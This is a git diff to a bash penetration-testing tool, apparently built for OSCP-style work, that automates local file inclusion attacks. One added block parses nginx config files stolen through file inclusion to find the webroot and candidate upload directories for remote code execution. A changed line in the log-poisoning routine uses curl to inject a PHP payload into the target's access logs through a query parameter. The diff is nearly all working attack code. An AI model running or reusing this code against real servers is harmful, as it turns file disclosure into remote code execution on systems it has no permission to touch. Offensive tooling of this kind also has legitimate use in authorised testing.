@@ -480,6 +480,20 @@ _lfi_auto_read() {
 
   echo -e "\033[1;36m  └─── ${files_read} files read ────────────────────────────\033[0m" >&2
 
+  # ── SERVER CONFIG ANALYSIS (feed RCE engine) ──
+  # Extract webroot, server type, and blocked paths from config files
+  local _srv_conf="${lfi_reads_dir}/etc_nginx_sites-enabled_default.txt"
+  [[ ! -f "$_srv_conf" ]] && _srv_conf="${lfi_reads_dir}/etc_nginx_conf.d_default.conf.txt"
+  if [[ -f "$_srv_conf" ]] && [[ -s "$_srv_conf" ]]; then
+    local _webroot; _webroot=$(grep -oP 'root\s+\K[^;]+' "$_srv_conf" 2>/dev/null | head -1 | tr -d ' ')
+    [[ -n "$_webroot" ]] && echo -e "\033[1;33m  ┌ Webroot discovered: ${_webroot}\033[0m" >&2
+    # Check for blocked directories (potential upload dirs)
+    grep -oP 'location\s+\^~\s+\K[^{]+' "$_srv_conf" 2>/dev/null | while IFS= read -r blocked; do
+      blocked=$(echo "$blocked" | tr -d ' ')
+      echo -e "\033[1;33m  │ Blocked dir: ${blocked} (potential upload target)\033[0m" >&2
+    done
+  fi
+
   # ── LOG POISONING / RCE ESCALATION ──
   local oscp="${OSCP:-false}"
   if [[ "$oscp" != true ]]; then
@@ -583,7 +597,7 @@ _lfi_log_poison() {
 
   # Also try injecting via a GET parameter (some servers log full URLs)
   curl -sk -o /dev/null --max-time 5 \
-    "${target_base}/?traktr_poison=$(python3 -c "import urllib.parse;print(urllib.parse.quote('${php_payload}'))" 2>/dev/null || echo "${php_payload}")" 2>/dev/null || true
+    "${target_base}/?traktr_poison=$(python3 -c "import sys,urllib.parse;print(urllib.parse.quote(sys.argv[1]))" "${php_payload}" 2>/dev/null || echo "${php_payload}")" 2>/dev/null || true
 
   # Step 3: Include the log file and check if our code executed
   sleep 1
